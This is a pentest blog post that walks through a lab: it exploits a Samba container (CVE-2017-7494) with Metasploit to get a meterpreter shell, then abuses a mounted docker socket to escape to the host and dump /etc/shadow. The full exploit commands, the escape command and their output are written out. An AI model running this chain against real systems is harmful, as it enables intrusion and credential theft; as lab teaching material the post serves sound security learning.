---
title: "Abusing insecure docker deployments"
date: "2018-11-10T00:00:00Z"
draft: false 
tags: ["docker", "pentest", "attack"]
---

Is possible to abuse and escape from containers in several scenarios, in this
post I will explore the most basic one, that is abusing the docker socket to
escape the container and run code as *root* in the host machine.

<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
**Table of Contents**

- [Lab setup](#lab-setup)
- [Attack](#attack)
    - [Information gathering](#information-gathering)
    - [Getting access](#getting-access)
    - [Escalating privileges](#escalating-privileges)

<!-- markdown-toc end -->


# Lab setup

Since we will be using containers, you have to install
[docker](https://docker.com) to be able to run this lab.

### Create the network

The very first step is to create a docker network where those containers will be
created, so they can tak with each other:

``` shell
docker network create pwnage 
```

### Start the vulnerable container

For this example, we will use a container vulnerable to **CVE-2017-7494**, also
known as Samba Cry vulnerability. If you are interested in reading more about it
please check this repository
[opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494).

This vulnerability allow you to get remote code execution in a Samba server, we
will add the docker socket to the container, so we will have an example of
misusing docker.

``` shell
docker run --rm -it \
       --name vulnerable \
       --network pwnage \
       -v '/var/run/docker.sock:/var/run/docker.sock' \
       vulnerables/cve-2017-7494
```

### Start the attacker

To complete our environment we will need to add the attacker host to the
network. There is an exploit in the Samba Cry repository, but instead we will be
using Metasploit because it is easier to upload what is needed. There is an
image already build for that, just run the command bellow and everything will
run as needed for this lab:

``` shell
docker run --rm -it \
       --network pwnage \
       -v '/usr/bin/docker:/docker:ro' \
       strm/metasploit
```

After it is loaded you will be presented to this screen

![metasploit](https://raw.githubusercontent.com/opsxcq/docker-metasploit/master/print.png)


# Attack

## Information gathering

In any attack, the very first step is to gather information about the target. So
let's first check the connectivity by pinging the **vulnerable** container.

``` shell
ping -c 2 vulnerable 
```

If everything is OK you should expect an output like

``` shell

msf5 > ping -c 2 vulnerable 
[*] exec: ping -c 2 vulnerable 

PING vulnerable (172.20.0.2) 56(84) bytes of data.
64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=1 ttl=64 time=0.120 ms
64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=2 ttl=64 time=0.097 ms

--- vulnerable ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 0.097/0.108/0.120/0.015 ms
```

Then we proceed to a basic smb shares enumeration with:

``` shell
use auxiliary/scanner/smb/smb_enumshares
set rhosts vulnerable
run
```

The expected output is

``` shell
msf5 > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > set rhosts vulnerable
rhosts => vulnerable
msf5 auxiliary(scanner/smb/smb_enumshares) > run

[+] 172.20.0.2:139        - data - (DS) Data
[+] 172.20.0.2:139        - IPC$ - (I) IPC Service (Crying samba)
[*] vulnerable:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It show us that there is a share named **data** in this samba server.

## Getting access

Next step is to run the exploit against the host so we can obtain a shell. In
Metasploit this vulnerability is named **is_known_pipename** and is located in
`exploit/linux/samba/is_known_pipename`.

Run the command bellow to attack the host:

``` shell
use exploit/linux/samba/is_known_pipename
set RHOST vulnerable
set RPORT 445
set payload linux/x64/meterpreter/bind_tcp
set TARGET 3
set SMB_FOLDER data
set SMBUser sambacry
set SMBPass nosambanocry
exploit
```

If everything runs fine, you should be presented with a **meterpreter** shell like:

``` shell
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > set RHOST vulnerable
RHOST => vulnerable
msf5 exploit(linux/samba/is_known_pipename) > set RPORT 445
RPORT => 445
msf5 exploit(linux/samba/is_known_pipename) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf5 exploit(linux/samba/is_known_pipename) > set TARGET 3
TARGET => 3
msf5 exploit(linux/samba/is_known_pipename) > set SMB_FOLDER data
SMB_FOLDER => data
msf5 exploit(linux/samba/is_known_pipename) > set SMBUser sambacry
SMBUser => sambacry
msf5 exploit(linux/samba/is_known_pipename) > set SMBPass nosambanocry
SMBPass => nosambanocry
msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] vulnerable:445 - Using location \\vulnerable\data\ for the path
[*] vulnerable:445 - Retrieving the remote path of the share 'data'
[*] vulnerable:445 - Share 'data' has server-side path '/data
[*] vulnerable:445 - Uploaded payload to \\vulnerable\data\shyyEPPk.so
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using \\PIPE\/data/shyyEPPk.so...
[-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using /data/shyyEPPk.so...
[-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] Started bind TCP handler against vulnerable:4444
[*] Sending stage (816260 bytes) to vulnerable

meterpreter > 
```

## Escalating privileges

To escalate privileges we will abuse the docker socket being available inside
the container. Since `dockerd` runs as root in the host machine, it has root
permissions so we can abuse it to do several things. For example using
`--privileged` can give you several extended capabilities, the text bellow
explaining them was extracted from the official docker documentation:

> By default, Docker containers are “unprivileged” and cannot, for example, run a
> Docker daemon inside a Docker container. This is because by default a
> container is not allowed to access any devices, but a “privileged” container
> is given access to all devices (see the documentation on cgroups devices).
> When the operator executes docker run --privileged, Docker will enable access
> to all devices on the host as well as set some configuration in AppArmor or
> SELinux to allow the container nearly all the same access to the host as
> processes running outside containers on the host. 

You can access devices with `--device`, but in our case, we will map the root
file system (`/`) to the container and have access to it.

Since there is no docker client inside this container, the very first step is to
setup the docker client and its dependencies inside our target container. Just
run the command bellow and everything will be done.

``` shell
upload /docker /docker
upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
chmod 777 /docker
chmod +x /docker
```

``` shell
meterpreter > upload /docker /docker
[*] uploading  : /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] uploaded   : /docker -> /docker
meterpreter > upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploading  : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] Uploaded -1.00 B of 38.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploaded   : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
meterpreter > chmod 777 /docker
meterpreter > chmod +x /docker
meterpreter > 
```

And finally using docker to have access to the host file system.

``` shell
execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
```

And that is it, you escaped the container and dumped the machine local user
hashes, the output will look like:

``` shell
meterpreter > execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
Process 113 created.
Channel 13 created.
root:$1$UFKdtFGw$qp29y1qGWit/vnvIG0uSr1:17488:0:99999:7:::
daemon:*:17488:0:99999:7:::
bin:*:17488:0:99999:7:::
sys:*:17488:0:99999:7:::
sync:*:17488:0:99999:7:::
games:*:17488:0:99999:7:::
man:*:17488:0:99999:7:::
lp:*:17488:0:99999:7:::
mail:*:17488:0:99999:7:::
news:*:17488:0:99999:7:::
```

# References

- [Metasploit docker image](https://github.com/opsxcq/docker-metasploit)
- [Vulnerable container](https://github.com/opsxcq/exploit-CVE-2017-7494)
